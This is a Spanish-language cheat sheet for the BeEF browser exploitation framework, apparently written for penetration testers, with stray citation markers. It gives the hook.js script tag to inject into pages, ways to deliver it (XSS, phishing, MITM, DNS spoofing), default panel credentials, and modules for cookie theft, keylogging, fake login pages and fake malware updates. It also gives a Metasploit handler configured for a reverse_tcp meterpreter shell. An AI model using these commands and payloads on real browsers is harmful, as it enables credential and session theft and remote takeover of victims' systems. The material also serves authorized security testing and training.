# CHEATSHEET - BeEF (Browser Exploitation Framework)

## 🛠️ ¿QUÉ ES BEEF?

BeEF (Browser Exploitation Framework) es una herramienta de pruebas de penetración que se enfoca en explotar vulnerabilidades del navegador web [citation:2][citation:4]. A diferencia de otras herramientas que atacan servidores, BeEF ataca el **lado del cliente** (el navegador) [citation:8].

**Idea principal:** "Enganchar" (hook) uno o más navegadores y usarlos como punto de entrada para lanzar ataques [citation:1][citation:2].

---

## ⚠️ ADVERTENCIA LEGAL

> **BeEF solo debe usarse en entornos autorizados.**  
> No lo uses contra sistemas sin permiso explícito por escrito [citation:2][citation:8].

---

## 📋 INSTALACIÓN Y EJECUCIÓN

### En Kali Linux (viene preinstalado)
```bash
# Iniciar BeEF
sudo beef-xss

git clone https://github.com/beefproject/beef.git
cd beef
./install
./beef

#COMANDOS ÚTILES
# Iniciar con configuración personalizada
beef-xss -c /ruta/config.yaml

# Modo verboso (más información)
beef-xss -v

# Reiniciar base de datos
beef-xss -x

# Detener BeEF
beef-xss-stop

#SCRIPT de Hook
http://<TU_IP>:3000/hook.js

Inyecta el script en una página
<script src="http://192.168.1.100:3000/hook.js"></script>

Métodos para inyectar
1.XSS (Cross-Site Scripting) 

2. Ingeniería social (phishing, enlaces maliciosos) 

3. Ataques MITM con Bettercap 

4. DNS spoofing 

#ACCESO A LA INTERFAZ WEB
Elemento	Valor
Panel de control	http://127.0.0.1:3000/ui/panel
Usuario por defecto	beef
Contraseña por defecto	beef

#PANEL DE CONTROL (Tabs)
Pestaña	Función
Details	Información del navegador (versión, plugins, SO)
Logs	Eventos del navegador enganchado
Commands	Módulos de ataque
Proxy	Usar el navegador enganchado como proxy
XssRays	Detectar XSS en páginas enganchadas
Network	Topología de red

#CÓDIGO DE COLORES EN COMMANDS
Color	Significado
🟢 Verde	El comando funciona y no es visible para el usuario 
🟠 Naranja	Funciona, pero el usuario puede notarlo (social engineering) 
🔴 Rojo	No funciona en este navegador 
⚪ Gris	Puede funcionar pero no se ha verificado 

*Información y Reconocimiento
Comando	| Descripción
Get Browser Info |	Versión, plugins, SO 
Get Internal IP	| IP interna del objetivo (WebRTC o Java) 
Get Visited URLs |	Verifica si el usuario visitó una URL específica 
Get Cookies	| Robar cookies de sesión 
Keylogger	| Capturar tecleo del usuario

*Social Engineering
Comando	Descripción
Pretty Theft	Fake login page (roba credenciales) 
Simple Hijacker	Pop-ups al hacer clic en enlaces 
Clippy	Asistente falso que propone "actualizaciones" 
Fake Notification Bar	Barra de notificación falsa para descargar malware 
Redirect Browser	Redirigir a página controlada 
TabNabbing	Redirige pestaña cuando el usuario cambia de foco 
Fake Flash Update	Instalar extensión maliciosa como "actualización" 


*Control y Persistencia
Comando	Descripción
Raw JavaScript |	Ejecutar JS personalizado en el navegador 
Create Alert Dialog	| Mostrar alerta falsa 
Spyder Eye	| Capturar screenshot de la pantalla 
Create Pop Under|	Ventana oculta para mantener hook 
Man In The Browser |	Interceptar y modificar páginas 
Confirm Close Tab |	Evita que el usuario cierre la pestaña 

*Network y Escaneo
Comando	Descripción
Port Scanner |	Escanear puertos internos 
Ping Sweep |	Escanear red interna 
DNS Enumeration |	Enumerar DNS 
Fingerprint Network |	Identificar dispositivos en la red 

# En Metasploit
INTEGRACIÓN CON METASPLOIT
BeEF se puede integrar con Metasploit para post-explotación .

Flujo básico:

Hookear navegador con BeEF

Usar módulo de BeEF para ejecutar payload de Metasploit

Escuchar conexión en Metasploit

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <MI_IP>
set LPORT 8080
exploit

*COMANDOS DE CONSOLA (CLI)
*Desde la terminal de BeEF:
Comando	Función
target <id>	Seleccionar un navegador enganchado 
online	Listar navegadores enganchados activos 
offline	Listar navegadores previamente enganchados 
commands	Listar módulos disponibles 
select <module_id>	Seleccionar un módulo 
execute	Ejecutar el módulo seleccionado 
response	Ver respuestas 
help	Mostrar ayuda 
back	Volver al menú anterior 
exit	Salir de la consola 
